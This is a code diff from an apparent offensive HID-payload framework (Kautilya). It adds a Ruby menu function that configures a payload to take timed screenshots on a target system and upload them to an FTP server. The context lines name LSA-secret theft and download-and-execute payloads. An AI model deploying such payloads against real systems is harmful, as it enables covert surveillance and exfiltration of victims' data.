@@ -418,6 +418,19 @@ def lsa_secrets()
 
 end
 
+def screenshot()
+  puts"\nThis payload takes screenshots from the target system at a given interval and uploads it to a FTP server after a given time interval.".bold
+  puts"It is based on Get-TimedScreenshot from powersploit.".bold
+  puts"The code was submitted by Christian Schneider (@busbauen) and has been modified for Kautilya. \n".bold
+  screeninterval = input("Enter the time interval in seconds for screenshots to be taken: ")
+  time = input("Enter the time interval in seconds for packets to be uploaded to ftp: ")
+  username = input("Enter username for the ftp server: ")
+  password = input_pass("Enter password for the ftp server: ")
+  server = input("Enter IP address of the ftp server: ")
+  directory = input("Name of the directory on the FTP Server where screenshots could be uploaded: ")
+  search_replace("./lib/src/screenshot.ino","#$output_path/output/screenshot.ino",screeninterval,time,username,password,server,directory)
+end
+
 def linux_download_execute
   puts"\nThis payload downloads an elf in text format, changes it back to elf using xxd and executes it.".bold
   puts"You must manually convert and upload an elf to text.".bold
